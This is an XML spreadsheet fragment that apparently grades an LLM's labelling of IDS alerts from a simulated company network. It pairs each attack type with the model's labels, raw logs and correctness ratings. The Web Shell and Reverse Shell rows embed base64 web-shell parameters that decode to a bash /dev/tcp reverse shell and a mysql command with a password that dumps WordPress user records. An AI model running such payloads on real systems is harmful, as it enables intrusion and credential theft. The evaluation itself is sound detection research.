            <text:p>IDS: “sshd: insecure connection attempt (scan).”, mitre – technique: “SSH”, id: “T1021.004”, tactic: “Lateral Movement”</text:p>
            <text:p>Raw Data: “webserver sshd[25473]: Did not receive identification string from [IP] port [port]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS mitre classification</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Application Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET / HTTP/1.0 403 363 - -”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 403 and attempted access to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Manipulation,</text:p>
            <text:p>Network Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “First time this IDS alert is generated.”</text:p>
            <text:p>Raw Data: “SURICATA SMTP invalid reply [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name SMTP and tool name suricata</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Access Denied,</text:p>
            <text:p>Unauthorized Access Attempt</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attempted access to web base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text:p>
            <text:p>Web Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 3260 - Mozilla/5.0 (compatible; Nmap Scripting Engine; <text:a xlink:href="https://nmap.org/book/nse" xlink:type="simple">https://nmap.org/book/nse</text:a>.html)”, “POST /sdk HTTP/1.1 403 363 - Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)”</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Access Denied/Unauthorized Access Attempt</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Apache: Attempt to access forbidden file or directory.”</text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/html/nmaplowercheck1642508249”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name nmap</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>WPScan</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="7" calcext:value-type="float">
            <text:p>7</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reconnaissance, </text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.002”, tactic: “Reconnaissance”</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/change-wp-admin-login/ HTTP/1.1 404 146 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name WPScan and http status code 404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5" calcext:value-type="float">
            <text:p>5</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reconnaissance,</text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”,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Reconnaissance,</text:p>
            <text:p>Web Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”</text:p>
            <text:p>Raw Data: <text:span text:style-name="T2">“HEAD /wp-content/plugins/regenerate-thumbnails-advanced/ HTTP/1.1 404 146 </text:span><text:span text:style-name="T2"><text:a xlink:href="https://intranet.price.fox.org/" xlink:type="simple">https://intranet.price.fox.org</text:a></text:span><text:span text:style-name="T2"> WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:span></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name WPScan and http status code 404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alid Account Use,</text:p>
            <text:p>Credential Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactics: “Defense Evasion, Persistence, Privilege Escalation, Initial Access”</text:p>
            <text:p>Raw Data: “taylorcruz-mail dovecot: imap-login: Login: user=&lt;christopher.friedman&gt;, method=PLAIN”</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Reconnaissance,</text:p>
            <text:p>Web Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”</text:p>
            <text:p>Raw Data: “GET /academics HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on repeated http status code 404 for am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Web Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.002”, tactic: “Reconnaissance” </text:p>
            <text:p>Raw Data: “GET /accountants HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on repeated http status code 404 for sam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Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: "Multiple web server 400 error codes from same source ip.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.002”, tactic: “Reconnaissance”</text:p>
            <text:p>Raw Data: “GET /bea HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on repeated http status code 404 for sam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Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”</text:p>
            <text:p>Raw Data: “GET /beheer HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on repeated http status code 404 for sam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Application Discovery,</text:p>
            <text:p>Web Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”</text:p>
            <text:p>Raw Data: “GET /wp-admin/user/webcalendar HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to potential subfolders in WordPress admin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ttempted Credential Access, </text:p>
            <text:p>Access to Sensitive Files</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attempted access to sensitive password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Scanning</text:p>
            <text:p>Exploit Public-Facing Application</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”</text:p>
            <text:p>Raw Data: “GET /wp-content/plugins/_vti_bin/_vti_aut/author.dll HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to sharepoint web servic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Scanning,</text:p>
            <text:p>Plugin Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/skins/wordpress/i HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to non-existent file in WordPress folder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Application Scanning</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/skins/wordpress/images/zh_TW HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to non-existent file in WordPress folder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Credential Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion, Persistence, Privilege Escalation, Initial Access”</text:p>
            <text:p>Raw Data: “miller-mail dovecot: imap-login: Login: user=&lt;megan.johnson&gt;, method=PLAIN”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on successful imap log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Creden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text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on successful imap login</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Alternate explanation for alert</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Protocol Anomaly</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Suricata: Alert - SURICATA HTTP unable to match response to request”</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Network Protocol Anomaly</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “IDS event.”</text:p>
            <text:p>Raw Data: “SURICATA HTTP unable to match response to request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TLS Evasion, </text:p>
            <text:p>Protocol Anomaly</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Suricata: Alert - SURICATA TLS invalid handshake message”</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TLS Evasion, </text:p>
            <text:p>Protocol Anomaly</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “IDS event.”</text:p>
            <text:p>Raw Data: “SURICATA TLS invalid record/traffic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Brute Force Attack</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the IDS mitre classification</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Initial Access, </text:p>
            <text:p>Persistence,</text:p>
            <text:p>Defense Evasion</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ext:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on the IDS mitre classification (tactics)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Privilege Escalation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Privilege Escalation,</text:p>
            <text:p>Initial Access, </text:p>
            <text:p>Persistence,</text:p>
            <text:p>Defense Evasion</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ext:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on the IDS mitre classification (tactics)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Privilege Escalation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="3" calcext:value-type="float">
            <text:p>3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Privilege Escalation, </text:p>
            <text:p>Defense Evasion</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the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2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Persistence,</text:p>
            <text:p>Privilege Escalation</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce6" office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “PAM: Login session closed.”</text:p>
            <text:p>Raw Data: “intranet-server sudo: pam_unix(sudo:session): session closed for user root”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on the tool name sudo and PAM session closing</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Correct &amp; expressive</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell/>
          <table:table-cell table:formula="of:=SUM([.B2:.B37])" office:value-type="float" office:value="73" calcext:value-type="float">
            <text:p>73</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="6"/>
        </table:table-row>
      </table:table>
      <table:table table:name="TP_aminer_gemini_run2" table:style-name="ta1">
        <table:table-column table:style-name="co1" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co30" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co31" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co32" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co28" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co33"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6" calcext:value-type="float">
            <text:p>6</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Command and Control,</text:p>
            <text:p>Data Exfiltration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in DNS domain.”, “Value entropy anomaly detected”,</text:p>
            <text:p>Raw Data: “dnsmasq[14460]: query[A] youtu.be from [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name dnsmasq and high entropy in DNS domai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Reconnaissance,</text:p>
            <text:p>Network Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of query records in DNS logs.”, “Frequency anomaly detected”,</text:p>
            <text:p>Raw Data: “dnsmasq[14522]: query[A] mail.price.fox.org [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on high frequency of DNS A queries</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Incorrec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Brute Force,</text:p>
            <text:p>Account Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “taylorcruz-mail dovecot: imap-login: Disconnected (no auth attempts in 0 secs): user=&lt;&gt;, rip=192.168.130.77”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on unsuccessful imap login without auth atemp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Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “no host name found for IP address [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on repeated unsuccessful hostname resolving for same IP</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Web Attack,</text:p>
            <text:p>Exploitation Attempt</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probably based on attempted access to web base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Network Evasion,</text:p>
            <text:p>Exploitation Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “TLS error on connection from [192.168.130.77] (gnutls_handshake): An unexpected TLS packet was received.”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name TLS and unexpected TLS packet</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Reconnaissance,</text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 363 - Mozilla/5.0 (compatible; Nmap Scripting Engine; <text:a xlink:href="https://nmap.org/book/nse.html" xlink:type="simple">https://nmap.org/book/nse.html</text:a>)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name nmap and 403 erro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 </text:p>
            <text:p>Access Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”, </text:p>
            <text:p>Raw Data: “GET / HTTP/1.0 403 363 - - ”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 403</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5" calcext:value-type="float">
            <text:p>5</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reconnaissance,</text:p>
            <text:p>Web Attack</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Classification probably based on <text:s/>repeated unsuccessful access to web root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Reconnaissance,</text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/plugins/akismet/ HTTP/1.1 403 3362 https://intranet.price.fox.org WPScan v3.8.20 (<text:a xlink:href="https://wpscan.com/wordpress-security-scanner" xlink:type="simple">https://wpscan.com/wordpress-security-scanner</text:a>)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name WPScan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4" calcext:value-type="float">
            <text:p>14</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reconnaissance,</text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data:  “HEAD /wntent/plu/analytics-for-wp/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Credential Access</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attempted access to sensitive file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6" calcext:value-type="float">
            <text:p>16</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reconnaissance, </text:p>
            <text:p>Discovery</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in request</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Reconnaissance, </text:p>
            <text:p>Vulnerability Scanning</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php config file in WordPress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Reconnaissance, </text:p>
            <text:p>Information Disclosure Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type”, “New path(es) detected”, </text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-includes/sitemaps/phpinfo.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to php config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Information Gathering</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WordPress folder without valid DirectoryIndex</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Reconnaissance,</text:p>
            <text:p>Credential Access</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ttempted access to hidden file in WordPres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Reconnaissance, </text:p>
            <text:p>Directory Traversal</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/langs HTTP/1.1 301 515 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 301</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Directory Traversal</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/plugins/hr/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to WordPress plugin folder, HTTP code is different than above, except for that they are the same; which indicated that the http code might not be that important for the classif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Reconnaissance,</text:p>
            <text:p>Credential Access</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attempted access to hidden file in WordPress folder and http status code 403</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Alternate explanation for alert</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell, </text:p>
            <text:p>Command and Control, </text:p>
            <text:p>Exfiltration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,</text:p>
            <text:p>Raw Data: “/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on high entropy because of base64 encoded payload and mysql query / github download in decoded payload</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Password cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell, </text:p>
            <text:p>Credential Access, </text:p>
            <text:p>Defense Evasion</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because of base64 encoded payload and wphashcrack and rockyou.txt in decoded payload; could be more focused on password cracking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 </text:p>
            <text:p>Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”,</text:p>
            <text:p>Raw Data: “POST /services/ajax.php/imp/poll HTTP/1.1 200 463 <text:a xlink:href="https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox" xlink:type="simple">https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox</text:a> Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on high frequency of apache access requests, representing potential scanning</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source Hijacking, </text:p>
            <text:p>Denial of Service</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significant increase in CPU usag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  </text:p>
            <text:p>Command and Control</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probably based on high frequencies of DNS query Ip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text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”</text:p>
            <text:p>Raw Data: “GET / HTTP/1.1 200 6128 - Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on high occurrence frequency of Apache Access requests, however the requests are successful</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Incorrect</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reverse Shell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell, </text:p>
            <text:p>Command and Control, </text:p>
            <text:p>Defense Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”, </text:p>
            <text:p>Raw Data: “/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on high entropy because of base64 encoded payload and decoded payload containing bash script executing sh command to create a reverse shell</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 /dev/pts/1 www-data:phopkin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Privilege Escalation,</text:p>
            <text:p>Defense Evasion</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Privilege Escalation,</text:p>
            <text:p>Defense Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New user_acct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Privilege Escalation,</text:p>
            <text:p>Defense Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New cred_acq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Privilege Escalation,</text:p>
            <text:p>Defense Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New user_start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35])" office:value-type="float" office:value="100" calcext:value-type="float">
            <text:p>100</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="6"/>
        </table:table-row>
      </table:table>
      <table:table table:name="TP_wazuh_gemini_run2" table:style-name="ta1">
        <table:table-column table:style-name="co69" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co1"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1" table:number-columns-repeated="3"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number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce4"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Protocol Anomaly,</text:p>
            <text:p>Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Suricata: Alert - SURICATA TLS invalid record/traffic”</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3"/>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Network Protocol Anomaly,</text:p>
            <text:p>Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Suricata: Alert - SURICATA TLS invalid handshake message”</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3"/>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Network Protocol Anomaly,</text:p>
            <text:p>Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “IDS event.”</text:p>
            <text:p>Raw Data: “SURICATA TLS invalid handshake message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3"/>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Network Protocol Anomaly,</text:p>
            <text:p>Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “IDS event.”</text:p>
            <text:p>Raw Data: “SURICATA TLS invalid record/traffic [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name Suricata and protocol name TLS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>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Network Scan,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “sshd: insecure connection attempt (scan).”,</text:p>
            <text:p>Raw Data: “internal-share sshd[28182]: Did not receive identification string from [IP] port [Port]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on low line “did not receive identificatio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Application Attack, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET / HTTP/1.0 403 363 - - ”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS description</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</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Network Protocol Anomaly, </text:p>
            <text:p>Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “First time this IDS alert is generated.”,</text:p>
            <text:p>Raw Data: “SURICATA SMTP invalid reply [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on the raw log data</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Web Application Attack,  </text:p>
